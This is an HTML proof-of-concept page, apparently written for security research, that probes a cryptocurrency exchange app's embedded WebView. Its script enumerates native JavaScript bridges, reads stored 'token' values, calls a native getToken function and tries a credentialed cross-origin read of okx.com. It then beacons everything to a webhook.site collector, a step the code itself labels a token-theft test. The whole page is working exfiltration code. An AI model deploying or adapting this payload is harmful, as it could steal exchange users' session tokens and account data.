<!doctype html>
<html><head><meta name="viewport" content="width=device-width,initial-scale=1"><title>OKX WebView Probe v2</title>
<style>body{font:13px monospace;padding:10px;background:#111;color:#0f0;word-break:break-all}.b{font-size:16px}</style></head>
<body>
<h3 class="b" id="verdict">PROBING v2…</h3>
<pre id="out"></pre>
<script>
var COLLECTOR="https://webhook.site/200683c0-7735-4db9-bdfe-d31372282f17";
var out=document.getElementById('out'), verdict=document.getElementById('verdict');
function log(k,v){ out.textContent+=k+': '+v+'\n'; }
function beacon(obj){ try{var q=COLLECTOR+"/leak?"+Object.keys(obj).map(function(k){return k+"="+encodeURIComponent((obj[k]==null?"":(""+obj[k])).slice(0,300))}).join("&"); new Image().src=q;}catch(e){}
  try{fetch(COLLECTOR+"/leak",{method:"POST",mode:"no-cors",body:JSON.stringify(obj)});}catch(e){} }

function bridges(){
  var found=[];
  for(var k in window){ try{ var v=window[k];
    if(v && (typeof v==='object'||typeof v==='function')){
      var m=[]; for(var p in v){ try{ if(typeof v[p]==='function') m.push(p); }catch(e){} }
      if(m.length && /native|interc|bridge|okx|jsbridge|android|ok_|okla/i.test(k)) found.push(k+"{"+m.join(",")+"}");
    } }catch(e){} }
  return found.join(" | ")||"none-named";
}

function probe(tag){
  var d={tag:tag, loc:location.href, origin:location.origin};
  try{ d.bridges = bridges(); }catch(e){ d.bridges='err:'+e; }
  try{ d.ls_token=localStorage.getItem('token'); }catch(e){}
  try{ d.ss_token=sessionStorage.getItem('token'); }catch(e){}
  try{ d.getToken=(window.native&&native.getToken)?native.getToken():'nofn'; }catch(e){ d.getToken='err:'+e; }
  try{ d.shouldIntercept=(window.interception&&interception.shouldIntercept)?interception.shouldIntercept('https://www.okx.com/api/v5/account/balance'):'nofn'; }catch(e){ d.shouldIntercept='err:'+e; }
  for(var k in d) log(k,d[k]);
  beacon(d);
}

// TOKEN-THEFT TEST: can we read a cross-origin AUTHENTICATED okx.com response via the native interceptor?
function corsTest(){
  var tag='AJAXINTERCEPT'+Math.floor(Math.random()*1e6);
  var target='https://www.okx.com/?'+tag;
  fetch(target,{credentials:'include'}).then(function(r){
    return r.text().then(function(t){
      var res={tag:'CORS_okx', status:r.status, type:r.type, len:t.length,
               authed:/logout|uid|userId|accountId|"isLogin":true|myAssets/i.test(t),
               snippet:t.slice(0,120)};
      for(var k in res) log(k,res[k]);
      if(r.type!=='opaque' && t.length>0){ verdict.textContent='*** CROSS-ORIGIN okx.com READ OK (authed='+res.authed+') ***'; verdict.style.color='#f00'; }
      beacon(res);
    });
  }).catch(function(e){ log('CORS_okx','blocked/err: '+e); beacon({tag:'CORS_okx',err:''+e}); });
}

probe('t0'); setTimeout(function(){probe('t3000');corsTest();},3000); setTimeout(function(){probe('t7000')},7000);
setTimeout(function(){ if(verdict.textContent.indexOf('PROBING')===0){verdict.textContent='done — see log';verdict.style.color='#0f0';} },8500);
</script>
</body></html>
